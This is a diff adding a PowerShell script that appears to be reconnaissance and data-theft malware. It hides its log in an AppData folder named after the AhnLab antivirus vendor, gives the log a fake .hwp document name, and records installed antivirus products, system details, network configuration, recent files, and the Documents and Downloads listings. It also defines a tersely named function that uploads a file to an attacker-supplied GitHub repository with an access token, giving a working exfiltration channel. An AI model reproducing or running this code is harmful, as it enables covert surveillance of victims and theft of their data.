@@ -1,0 +1,79 @@
+$logPath = $env:APPDATA + "\Ahnlab\"
+New-Item -Path $logPath -Type directory -Force
+$lgffff = $logPath + "mgt.hwp"
+
+"========= Vaccine Information =========" >> $lgffff
+$antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
+$antivirus >> $lgffff
+
+"========= System Information =========" >> $lgffff
+$os = Get-CimInstance -ClassName Win32_OperatingSystem
+$os >> $lgffff
+$os.Caption >> $lgffff
+$os.InstallDate >> $lgffff
+$os.LastBootUpTime >> $lgffff
+$os.OSArchitecture >> $lgffff
+$os.MUILanguages  >> $lgffff
+$os.Version >> $lgffff
+"========= Program Information =========" >> $lgffff
+$prglst = ls -Path "c:\\program files" -Depth 2
+$prglst >> $lgffff
+$prglst = ls -Path "c:\\program files (x86)" -Depth 2
+$prglst >> $lgffff
+"========= PSDrive Information =========" >> $lgffff
+$drvsz = Get-PSDrive -PSProvider FileSystem
+$drvsz >> $lgffff
+
+"========= IP Address Information =========" >> $lgffff
+ipconfig /all >> $lgffff
+
+"========= Recent Information =========" >> $lgffff
+$recent = Get-ChildItem ([Environment]::GetFolderPath("Recent"))
+$recent >> $lgffff
+
+"========= Some Directory Information =========" >> $lgffff
+$docPath = "$env:userprofile\Documents"
+dir $docPath -depth 3 >> $lgffff
+$docPath = "$env:userprofile\Downloads"
+dir $docPath -depth 3 >> $lgffff
+
+[Net.ServicePointManager]::SecurityProtocol +='tls12'
+
+function g-u {
+    param (
+        $token,
+        $message = '',
+        $file,
+        $owner,
+        $repo,
+        $path = '.\',
+        $sha,
+        [switch]$force
+    )
+
+    $path = (Join-Path $path (Split-Path $file -Leaf))
+
+    $base64token = [System.Convert]::ToBase64String([char[]]$token)
+
+    $headers = @{
+        Authorization = 'Basic {0}' -f $base64token
+    }
+
+    if ($force -and !$sha) {
+        $sha = $(
+            try {
+                (git-getfile -token $token -owner $owner -repo $repo -path $path).sha
+            } catch {
+                $null
+            }
+        )
+    }
+
+    $body = @{
+        message = $message
+        content = [convert]::ToBase64String((Get-Content $file -Encoding Byte))
+        sha = $sha
+    } | ConvertTo-Json
+
+    Invoke-RestMethod -Headers $headers -Uri https://api.github.com/repos/$owner/$repo/contents/$path -Body $body -Method Put
+}
